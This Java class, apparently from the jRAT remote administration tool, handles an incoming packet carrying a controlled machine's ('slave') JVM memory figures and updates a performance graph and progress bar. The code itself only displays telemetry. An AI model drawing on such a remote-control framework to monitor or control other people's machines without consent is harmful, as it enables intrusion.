package se.jrat.client.packets.incoming;

import java.io.DataInputStream;

import se.jrat.client.Slave;
import se.jrat.client.ui.frames.FrameControlPanel;
import se.jrat.client.ui.panels.PanelControlPerformance;
import se.jrat.common.utils.MathUtils;


public class Packet24JVMMemory extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		int current = slave.readInt();
		int max = slave.readInt();
		
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		
		if (frame != null) {
			PanelControlPerformance panel = (PanelControlPerformance) frame.panels.get("system monitor");

			if (panel != null) {
				panel.getGraph().addValues(current, max);

				if (frame.getTabbedPane().getTitleAt(1).equals("System Info") && frame.getTabbedPane().getSelectedIndex() == 1) {
					panel.getGraph().repaint();
				}
				panel.getProgressBar().setValue(MathUtils.getPercentFromTotal(current, max));
			}
		}

	}

}
